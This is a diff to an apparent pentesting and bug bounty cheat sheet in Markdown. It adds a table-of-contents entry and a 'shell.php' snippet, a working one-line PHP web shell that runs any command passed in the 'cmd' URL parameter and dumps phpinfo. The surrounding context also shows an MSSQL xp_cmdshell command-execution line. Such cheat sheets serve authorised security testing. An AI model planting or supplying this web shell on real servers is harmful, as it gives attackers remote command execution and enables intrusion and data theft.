@@ -15,6 +15,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [CSP](#csp)
 - [XSS](#xss)
 - [SQLi](#sqli)
+- [PHP](#php)
 - [Network](#network)
 - [Linux](#linux)
 
@@ -183,6 +184,13 @@ GO
 RECONFIGURE
 GO
 xp_cmdshell 'COMMAND';
+```
+
+### PHP
+
+shell.php
+```php
+<?php echo "Shell: ";system($_GET['cmd']); phpinfo();?>
 ```
 
 ### Network
